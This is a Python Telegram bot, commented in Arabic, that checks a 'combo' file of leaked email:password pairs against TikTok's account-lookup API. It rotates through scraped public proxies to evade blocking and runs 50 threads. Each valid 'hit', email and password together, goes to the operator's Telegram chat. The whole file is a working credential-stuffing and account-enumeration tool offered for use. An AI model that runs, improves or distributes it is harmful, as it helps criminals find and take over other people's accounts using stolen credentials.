import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الألوان ---
class Colors:
    G = '\033[92m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[0m'

class Stats:
    hits = 0
    bad = 0
    checked = 0
    proxies_list = []
    is_running = False
    total_in_file = 0

# --- إدخال البيانات (تأكد من كتابتها بدقة) ---
TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
ADMIN_ID = input(f"{Colors.C}[?] Enter Your Telegram ID (Chat ID): {Colors.W}").strip()

bot = telebot.TeleBot(TOKEN)

# التأكد من وجود مجلد البيانات فور تشغيل الكود
if not os.path.exists("data"):
    os.makedirs("data")

# --- وظيفة سحب البروكسيات ---
def scrape_proxies():
    print(f"{Colors.C}[*] Scrapping proxies...{Colors.W}")
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/officialputuid/proxy-list/master/http.txt"
    ]
    Stats.proxies_list = []
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")

# --- محرك الفحص الدقيق ---
def check_tiktok(line):
    if ":" not in line: return
    email, password = line.split(":", 1)
    
    # اختيار بروكسي عشوائي
    proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
    proxies = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None

    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
    params = {"email": email, "aid": "1233", "device_platform": "android"}
    headers = {"User-Agent": "com.zhiliaoapp.musically/2022405040 (Linux; U; Android 12)"}

    try:
        # فحص الحساب
        response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=7)
        data = response.json()
        
        # التأكد من أن الرد يحتوي على معلومات حقيقية
        if data.get("message") == "success":
            Stats.hits += 1
            # إرسال HIT فوراً للبوت
            bot.send_message(ADMIN_ID, f"✅ **New TikTok Hit!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
        elif "not registered" in str(data) or data.get("data", {}).get("error_code") == 1001:
            Stats.bad += 1
        else:
            # إذا كان البروكسي محظوراً أو رد تيك توك غير مفهوم، لا نحسبه BAD
            pass
    except:
        pass
    finally:
        Stats.checked += 1

# --- استقبال الملف من البوت ---
@bot.message_handler(content_types=['document'])
def handle_combo(message):
    if str(message.from_user.id) != ADMIN_ID: return
    if Stats.is_running:
        bot.reply_to(message, "⚠️ الفحص جاري حالياً.. انتظر.")
        return

    if message.document.file_name.endswith('.txt'):
        try:
            # تحميل وحفظ الملف
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            with open("data/combo.txt", "wb") as f:
                f.write(downloaded_file)
            
            with open("data/combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                combo_list = f.read().splitlines()

            Stats.total_in_file = len(combo_list)
            bot.reply_to(message, f"📥 تم استلام {Stats.total_in_file} حساب. بدأت العملية 🚀")
            
            # تحديث البروكسيات وبدء الفحص
            scrape_proxies()
            Stats.is_running = True
            threading.Thread(target=run_engine, args=(combo_list,)).start()
            
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")
    else:
        bot.reply_to(message, "❌ أرسل ملف .txt فقط.")

def run_engine(combo):
    Stats.hits = 0
    Stats.bad = 0
    Stats.checked = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor: # خفضنا الـ Workers لزيادة الدقة
        executor.map(check_tiktok, combo)
    
    Stats.is_running = False
    bot.send_message(ADMIN_ID, f"🏁 **انتهى الفحص!**\n✅ Hits: {Stats.hits}\n❌ Bad: {Stats.bad}")

@bot.message_handler(commands=['status'])
def get_status(message):
    if str(message.from_user.id) != ADMIN_ID: return
    bot.reply_to(message, f"📊 الإحصائيات:\n✅ Hits: {Stats.hits}\n❌ Bad: {Stats.bad}\n🔄 Checked: {Stats.checked} / {Stats.total_in_file}")

if __name__ == "__main__":
    print(f"{Colors.G}[+] Bot is alive! Send your combo.txt to the bot now.{Colors.W}")
    bot.infinity_polling()
